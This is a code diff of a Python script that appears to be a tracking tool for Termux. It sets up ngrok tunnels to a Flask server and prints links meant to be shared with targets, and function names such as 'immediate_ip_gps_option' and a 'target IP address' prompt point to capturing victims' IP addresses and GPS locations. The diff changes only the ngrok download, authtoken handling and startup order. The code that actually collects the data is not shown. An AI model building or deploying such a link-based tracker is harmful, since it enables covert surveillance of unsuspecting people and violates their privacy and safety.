@@ -122,50 +122,42 @@ def find_free_port():
         return s.getsockname()[1]
 
 def download_ngrok():
-    if os.path.isfile("ngrok") or os.path.isfile("ngrok.exe"):
-        return
-    print("\033[93m[•] Downloading ngrok...\033[0m")
-    os.system("curl -L -o ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip")
-    os.system("unzip ngrok.zip && rm ngrok.zip && chmod +x ngrok")
+    if not os.path.isfile("ngrok"):
+        print("\033[93m[•] Downloading ngrok...\033[0m")
+        os.system("pkg install -y wget unzip")
+        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
+        os.system("unzip ngrok.zip && rm ngrok.zip && chmod +x ngrok")
 
 def start_ngrok():
     global PORT
     PORT = find_free_port()
     download_ngrok()
-
-    if not os.path.isfile(".ngrok_token"):
-        token = input("Enter your Ngrok Authtoken (required once): ").strip()
-        with open(".ngrok_token", "w") as f:
-            f.write(token)
-        os.system(f"./ngrok authtoken {token}")
-    else:
-        with open(".ngrok_token") as f:
-            token = f.read().strip()
-        os.system(f"./ngrok authtoken {token}")
-
+    token = input("Enter your Ngrok Authtoken (required once): ").strip()
+    os.system(f"./ngrok authtoken {token}")
     cmd = ["./ngrok", "http", str(PORT)]
-    ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
     print("\033[93m[•] Starting Ngrok tunnel...\033[0m")
-    time.sleep(3)
-
-    # Wait for public URL
+    ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    # Retry fetching ngrok URL up to 10 times
+    public_url = None
     for _ in range(10):
         try:
+            time.sleep(2)
             tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()
-            if 'tunnels' in tunnels and tunnels['tunnels']:
-                public_url = tunnels['tunnels'][0]['public_url']
-                print(f"\033[92m[✓] Ngrok public URL: {public_url}\033[0m")
-                return ngrok_process, public_url
-        except:
-            time.sleep(1)
+            public_url = tunnels['tunnels'][0]['public_url']
+            print(f"\033[92m[✓] Ngrok public URL: {public_url}\033[0m")
+            break
+        except Exception as e:
+            continue
+    if not public_url:
+        print("\033[91m[✗] Failed to get ngrok URL after multiple attempts.\033[0m")
+        ngrok_process.terminate()
+        return None, None
 
-    print("\033[91m[✗] Failed to get ngrok URL.\033[0m")
-    ngrok_process.terminate()
-    return None, None
+    return ngrok_process, public_url
 
 def run_flask():
-    app.run(host="0.0.0.0", port=PORT)
+    app.run(host="0.0.0.0", port=PORT or 0)
 
 def ip_lookup():
     ip = input("Enter target IP address: ").strip()
@@ -176,13 +168,11 @@ def ip_lookup():
     print("\033[96m----------------\033[0m")
 
 def generate_link():
-    flask_thread = Thread(target=run_flask)
-    flask_thread.start()
-    time.sleep(2)
-
     ngrok_process, url = start_ngrok()
     if not url:
         return
+    flask_thread = Thread(target=run_flask)
+    flask_thread.start()
     print(f"\033[93m[•] Share this link: {url}/\033[0m")
     try:
         while flask_thread.is_alive():
@@ -193,13 +183,11 @@ def generate_link():
         flask_thread.join()
 
 def immediate_ip_gps_option():
-    flask_thread = Thread(target=run_flask)
-    flask_thread.start()
-    time.sleep(2)
-
     ngrok_process, url = start_ngrok()
     if not url:
         return
+    flask_thread = Thread(target=run_flask)
+    flask_thread.start()
     print(f"\033[93m[•] Share this link: {url}/immediate\033[0m")
     try:
         while flask_thread.is_alive():
